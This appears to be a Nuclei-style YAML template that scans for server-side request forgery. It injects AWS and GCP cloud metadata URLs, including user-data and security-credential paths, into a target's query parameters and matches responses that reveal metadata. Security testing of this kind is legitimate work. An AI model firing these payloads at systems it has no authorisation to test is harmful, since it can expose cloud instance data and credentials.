id: nawab-confirmed-ssrf

info:
  name: 🛸 Nawab-Confirmed-SSRF 🛸
  author: thenawabx
  severity: critical

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      Metadata-Flavor: "Google"

    payloads:
      ssrf_targets:
        - "http://169.254.169.254/latest/meta-data/"
        - "http://169.254.169.254/latest/meta-data/instance-id"
        - "http://metadata.google.internal/computeMetadata/v1/instance/id"
        - "http://169.254.169.254/latest/user-data"

    fuzzing:
      - part: query
        type: replace
        fuzz:
          - "{{ssrf_targets}}"

    matchers-condition: or
    matchers:
      - type: regex
        name: aws-metadata
        part: body
        regex:
          - "ami-id"
          - "instance-id"
          - "iam/security-credentials/"

      - type: word
        name: gcp-metadata
        part: header
        words:
          - "Metadata-Flavor: Google"

      - type: word
        name: azure-metadata
        part: body
        words:
          - "microsoft.compute"
